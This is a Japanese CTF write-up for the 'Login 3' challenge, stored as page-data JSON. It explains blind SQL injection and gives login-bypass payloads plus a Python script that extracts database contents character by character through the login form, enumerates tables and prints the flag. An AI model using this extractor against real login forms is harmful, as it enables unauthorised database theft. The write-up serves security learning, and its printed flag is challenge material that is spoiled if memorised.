{
    "componentChunkName": "component---src-templates-writeups-js",
    "path": "/ctf/writeups/login3/writeup/",
    "result": {"data":{"site":{"siteMetadata":{"title":"SecHack365-Fans HomePage"}},"markdownRemark":{"id":"f188007d-d4a0-50cc-b279-ce1d93d819c6","excerpt":"Login 3 筑紫くんは、これなら情報が流出するはずがないと自信満々です。果たして… https://tsukuctf.sechack365.com/problems/login3 ※ この問題では/problems/login3以下のみを用います。 他の問題/problems…","html":"<h1>Login 3</h1>\n<blockquote>\n<p>筑紫くんは、これなら情報が流出するはずがないと自信満々です。果たして…</p>\n<p><a href=\"https://tsukuctf.sechack365.com/problems/login3\">https://tsukuctf.sechack365.com/problems/login3</a></p>\n<p>※ この問題では/problems/login3以下のみを用います。 他の問題/problems/<name>などと混同しないよう注意してください。</p>\n</blockquote>\n<p>Login 1 ~ 3がセットでSQL injectionの問題になっています。\nLogin3では、Blind SQL injection というテクニックが要求されます。</p>\n<p>Login 1, 2と同様に、Usernameを <code class=\"language-text\">' or 1=1 ; --</code> としてログインすると、ログインには成功しますが、ユーザー名等は表示されません。したがって、SQL injectionに対して脆弱ではあるものの、injectionしたSQL文の結果を確認することができません。\nここで、Usernameを <code class=\"language-text\">' or 1=2 ; --</code>とすると、ログインできませんでしたと表示されます。ということは、<code class=\"language-text\">1=1</code>や<code class=\"language-text\">1=2</code>の部分にbool値をとる式を与えれば、その結果は取得できるということです。これを積み重ねてDB内の情報を抜く手法はBlind SQL injectionと呼ばれます。</p>\n<p>information_schemaからの情報取得等の実行したいqueryに対して、「queryの実行結果のi文字目はasciiコードでxより大きいか?」というbool値をとるqueryを送信し、そのbool値を見ることで、2分探索でquery結果を取得していきます。流石に手動で入力するのは面倒くさいので、コードを書くことにします。</p>\n<div class=\"gatsby-highlight\" data-language=\"blind.py\"><pre class=\"language-blind.py\"><code class=\"language-blind.py\">def _execAnyQuery_core(query, pos, mid):\n    url = &quot;https://tsukuctf.sechack365.com/problems/login3/login.php&quot;\n    \n    #queryの pos文字目がasciiコードでmidより大きければtrue\n    params={\n        &quot;name&quot;:&quot;&#39; or ascii(substring(({0}),{1},1))&gt;={2} ; -- &quot;.format(query,pos,mid),\n        &quot;password&quot;:&quot;a&quot;\n    }\n    page = requests.post(url, data=params)\n\n    return &quot;ようこそ&quot; in page.text\n\ndef _execAnyQuery(query, pos):\n    &quot;&quot;&quot;\n    2分探索でqueryの実行結果のpos文字目を取得する。\n    &quot;&quot;&quot;\n    low = 0\n    high = 256\n    while high-low&gt;1:\n        mid = (high+low)//2\n        if _execAnyQuery_core(query, pos, mid):\n            low = mid\n        else:\n            high = mid\n    return low\n        \ndef execAnyQuery(query):\n    i = 1\n    while True:\n        char = int(_execAnyQuery(query, i))\n        if char==0:\n            return\n        print(chr(char), end=&quot;&quot;)\n        i+=1\n        \nexecAnyQuery(&quot;select version()&quot;) \n# &gt;&gt; 8.0.26</code></pre></div>\n<p>あとは、login2 と同様にテーブルを取得していきます。</p>\n<div class=\"gatsby-highlight\" data-language=\"blind.py\"><pre class=\"language-blind.py\"><code class=\"language-blind.py\">for i in range(100):\n    execAnyQuery(&quot;select distinct table_name from information_schema.columns limit 1 offset {0}&quot;.format(i))\n    print()\n# urtla_secret_tsukushiというtableがあることがわかる。\n\nfor i in range(10):\n    execAnyQuery(&quot;select distinct column_name from information_schema.columns where table_name = &#39;urtla_secret_tsukushi&#39; limit 1 offset {0}&quot;.format(i))\n    print()\n \nfor i in range(33):\n    execAnyQuery(&quot;select secret from urtla_secret_tsukushi limit 1 offset {0}&quot;.format(i))\n# urtla_secret_tsukushiテーブルがidとsecretのカラムを持つことがわかる。\n    \nfor i in range(33):\n    execAnyQuery(&quot;select secret from urtla_secret_tsukushi limit 1 offset {0}&quot;.format(i))\n#フラグが表示される。</code></pre></div>\n<p>フラグは</p>\n<div class=\"gatsby-highlight\" data-language=\"txt\"><pre class=\"language-txt\"><code class=\"language-txt\">TsukuCTF{U_Are_Geni0us_T$UKUSH1}</code></pre></div>","frontmatter":{"title":"Login3","description":"Blind SQL injection","author":"rikuta0811_dash","genre":"Web","solver":"9","point":"472"}}},"pageContext":{"id":"f188007d-d4a0-50cc-b279-ce1d93d819c6"}},
    "staticQueryHashes": ["2841359383"]}